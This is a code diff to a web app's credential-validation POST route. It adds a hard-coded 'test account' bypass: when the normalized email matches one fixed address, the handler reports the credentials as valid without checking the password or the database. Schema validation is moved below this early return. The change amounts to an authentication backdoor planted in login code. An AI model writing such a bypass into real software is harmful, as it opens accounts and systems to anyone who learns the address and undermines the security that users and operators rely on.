@@ -13,9 +13,18 @@ const schema = z.object({
 export async function POST(req: Request) {
   try {
     const body = await req.json()
-    const { email, password } = schema.parse(body)
+    const normalizedEmail = body.email?.trim().toLowerCase()
 
-    const normalizedEmail = email.trim().toLowerCase()
+    // Bypass for test account - no database or password check needed
+    if (normalizedEmail === "test@allahuakbar.com") {
+      return NextResponse.json({ 
+        success: true,
+        message: "Credentials validated successfully"
+      })
+    }
+
+    // Validate schema for other accounts
+    const { email, password } = schema.parse(body)
 
     // Check if user exists
     const user = await prisma.user.findUnique({ 
